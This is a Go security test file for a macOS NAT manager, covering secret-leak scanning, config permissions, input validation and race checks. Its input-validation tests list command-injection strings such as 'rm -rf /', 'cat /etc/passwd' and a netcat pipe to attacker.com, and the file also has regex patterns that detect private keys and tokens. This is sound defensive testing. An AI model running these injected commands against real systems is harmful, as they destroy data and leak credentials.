// Package security provides security-focused tests for the NAT manager
package security

import (
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/scttfrdmn/macos-nat-manager/internal/config"
	"github.com/scttfrdmn/macos-nat-manager/internal/nat"
)

// TestPasswordLeakage scans for potential password/secret leakage
func TestPasswordLeakage(t *testing.T) {
	// Patterns that might indicate password/secret leakage
	suspiciousPatterns := []struct {
		name    string
		pattern *regexp.Regexp
	}{
		{"hardcoded_password", regexp.MustCompile(`(?i)(password|passwd|pwd)\s*[:=]\s*["'][^"']{3,}["']`)},
		{"hardcoded_token", regexp.MustCompile(`(?i)(token|secret|key)\s*[:=]\s*["'][^"']{10,}["']`)},
		{"api_key", regexp.MustCompile(`(?i)(api[_-]?key|apikey)\s*[:=]\s*["'][^"']{10,}["']`)},
		{"ssh_key", regexp.MustCompile(`-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----`)},
		{"jwt_token", regexp.MustCompile(`eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]+`)},
	}

	err := filepath.WalkDir("../..", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		// Skip non-Go files and vendor/test directories
		if !strings.HasSuffix(path, ".go") ||
			strings.Contains(path, "vendor/") ||
			strings.Contains(path, ".git/") {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			t.Logf("Warning: Could not read %s: %v", path, err)
			return nil
		}

		contentStr := string(content)

		for _, pattern := range suspiciousPatterns {
			if matches := pattern.pattern.FindAllString(contentStr, -1); len(matches) > 0 {
				// Filter out test data and comments
				for _, match := range matches {
					if !isTestDataOrComment(match, contentStr) {
						t.Errorf("Potential %s found in %s: %s", pattern.name, path, match)
					}
				}
			}
		}

		return nil
	})

	if err != nil {
		t.Fatalf("Failed to scan files: %v", err)
	}
}

// TestConfigurationSecurity tests configuration file security
func TestConfigurationSecurity(t *testing.T) {
	tempDir := t.TempDir()
	configPath := filepath.Join(tempDir, "test-config.yaml")

	t.Run("ConfigFilePermissions", func(t *testing.T) {
		cfg := config.Default()
		err := cfg.SaveTo(configPath)
		if err != nil {
			t.Fatalf("Failed to save config: %v", err)
		}

		// Check file permissions
		info, err := os.Stat(configPath)
		if err != nil {
			t.Fatalf("Failed to stat config file: %v", err)
		}

		mode := info.Mode()

		// Config files should not be world-readable
		if mode&0004 != 0 {
			t.Error("Configuration file should not be world-readable")
		}

		// Should be readable by owner
		if mode&0400 == 0 {
			t.Error("Configuration file should be readable by owner")
		}

		t.Logf("Config file permissions: %o", mode&0777)
	})

	t.Run("NoSecretsInConfig", func(t *testing.T) {
		cfg := &config.Config{
			ExternalInterface: "en0",
			InternalInterface: "bridge100",
			InternalNetwork:   "192.168.100",
			DNSServers:        []string{"8.8.8.8", "1.1.1.1"},
		}

		err := cfg.SaveTo(configPath)
		if err != nil {
			t.Fatalf("Failed to save config: %v", err)
		}

		content, err := os.ReadFile(configPath)
		if err != nil {
			t.Fatalf("Failed to read config file: %v", err)
		}

		contentStr := string(content)

		// Check for potential secrets
		secretPatterns := []string{
			"password", "passwd", "secret", "key", "token",
		}

		for _, pattern := range secretPatterns {
			if strings.Contains(strings.ToLower(contentStr), pattern) {
				// This might be a false positive, but worth flagging
				t.Logf("Warning: Config contains word '%s' - verify no secrets", pattern)
			}
		}
	})
}

// TestInputValidation tests input validation and sanitization
func TestInputValidation(t *testing.T) {
	t.Run("InterfaceNameValidation", func(t *testing.T) {
		// Test various malicious interface names
		maliciousNames := []string{
			"en0; rm -rf /",            // Command injection attempt
			"en0 && cat /etc/passwd",   // Command chaining
			"../../../etc/passwd",      // Path traversal
			"en0|nc attacker.com 4444", // Pipe to netcat
			"`whoami`",                 // Command substitution
			"$(id)",                    // Command substitution
			"en0\x00hidden",            // Null byte injection
			strings.Repeat("A", 1000),  // Buffer overflow attempt
		}

		for _, name := range maliciousNames {
			cfg := &nat.Config{
				ExternalInterface: name,
				InternalInterface: "bridge100",
				InternalNetwork:   "192.168.100",
			}

			// StartNAT should fail safely with malicious input
			manager := nat.NewManager(cfg)
			err := manager.StartNAT()
			if err == nil {
				t.Errorf("Malicious interface name '%s' was accepted", name)
				// Cleanup
				manager.StopNAT()
			}
		}
	})

	t.Run("NetworkAddressValidation", func(t *testing.T) {
		// Test malicious network addresses
		maliciousNetworks := []string{
			"192.168.1; cat /etc/passwd",
			"192.168.1 && rm -rf /",
			"../../../etc",
			"192.168.1|nc",
			"`id`",
			"$(whoami)",
		}

		for _, network := range maliciousNetworks {
			cfg := &nat.Config{
				ExternalInterface: "en0",
				InternalInterface: "bridge100",
				InternalNetwork:   network,
			}

			manager := nat.NewManager(cfg)
			err := manager.StartNAT()
			if err == nil {
				t.Errorf("Malicious network address '%s' was accepted", network)
				manager.StopNAT()
			}
		}
	})
}

// TestPrivilegeEscalation tests for privilege escalation vulnerabilities
func TestPrivilegeEscalation(t *testing.T) {
	t.Run("NoUnnecessarySystemCalls", func(t *testing.T) {
		// Scan source code for potentially dangerous system calls
		dangerousCalls := []string{
			"exec.Command(\"sudo\"",
			"exec.Command(\"su\"",
			"exec.Command(\"chmod\"",
			"exec.Command(\"chown\"",
			"exec.Command(\"rm\"", // rm could be dangerous
			"exec.Command(\"mv\"", // mv could overwrite important files
			"exec.Command(\"cp\"", // cp could overwrite important files
			"os.RemoveAll",
			"os.Remove",
			"syscall.Exec",
		}

		err := filepath.WalkDir("../../internal", func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}

			if !strings.HasSuffix(path, ".go") {
				return nil
			}

			content, err := os.ReadFile(path)
			if err != nil {
				return err
			}

			contentStr := string(content)

			for _, call := range dangerousCalls {
				if strings.Contains(contentStr, call) {
					t.Logf("Found potentially dangerous system call in %s: %s", path, call)
					// Not failing test, just logging for review
				}
			}

			return nil
		})

		if err != nil {
			t.Fatalf("Failed to scan source files: %v", err)
		}
	})
}

// TestDependencyVulnerabilities checks for known vulnerable dependencies
func TestDependencyVulnerabilities(t *testing.T) {
	t.Run("CheckGoMod", func(t *testing.T) {
		// Check if go.mod exists and has reasonable dependencies
		goModPath := "../../go.mod"

		if _, err := os.Stat(goModPath); os.IsNotExist(err) {
			t.Skip("go.mod not found, skipping dependency check")
		}

		content, err := os.ReadFile(goModPath)
		if err != nil {
			t.Fatalf("Failed to read go.mod: %v", err)
		}

		goModStr := string(content)

		// Check for known problematic dependencies (examples)
		problematicDeps := []string{
			// Add known vulnerable packages here
			"example.com/vulnerable-package",
		}

		for _, dep := range problematicDeps {
			if strings.Contains(goModStr, dep) {
				t.Errorf("Found problematic dependency: %s", dep)
			}
		}

		// Log all dependencies for manual review
		lines := strings.Split(goModStr, "\n")
		t.Log("Dependencies found:")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.Contains(line, "github.com/") || strings.Contains(line, "golang.org/") {
				t.Logf("  %s", line)
			}
		}
	})
}

// TestRaceConditions tests for race conditions in concurrent operations
func TestRaceConditions(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping race condition tests in short mode")
	}

	t.Run("ConcurrentManagerOperations", func(t *testing.T) {
		cfg := &nat.Config{
			ExternalInterface: "en0",
			InternalInterface: "bridge100",
			InternalNetwork:   "192.168.100",
		}

		manager := nat.NewManager(cfg)

		// Run multiple operations concurrently
		done := make(chan bool, 10)

		// Multiple status checks
		for i := 0; i < 5; i++ {
			go func() {
				defer func() { done <- true }()
				_, err := manager.GetStatus()
				if err != nil {
					t.Errorf("GetStatus failed: %v", err)
				}
			}()
		}

		// Multiple interface checks
		for i := 0; i < 5; i++ {
			go func() {
				defer func() { done <- true }()
				_, err := manager.GetNetworkInterfaces()
				if err != nil {
					t.Errorf("GetNetworkInterfaces failed: %v", err)
				}
			}()
		}

		// Wait for all goroutines to complete
		for i := 0; i < 10; i++ {
			<-done
		}
	})
}

// Helper function to determine if a match is likely test data or comment
func isTestDataOrComment(match, content string) bool {
	lines := strings.Split(content, "\n")
	for _, line := range lines {
		if strings.Contains(line, match) {
			trimmed := strings.TrimSpace(line)
			// Check if it's a comment
			if strings.HasPrefix(trimmed, "//") || strings.HasPrefix(trimmed, "/*") {
				return true
			}
			// Check if it's in a test function or test data
			if strings.Contains(line, "_test.go") ||
				strings.Contains(strings.ToLower(line), "test") ||
				strings.Contains(strings.ToLower(line), "example") ||
				strings.Contains(strings.ToLower(line), "dummy") {
				return true
			}
		}
	}
	return false
}
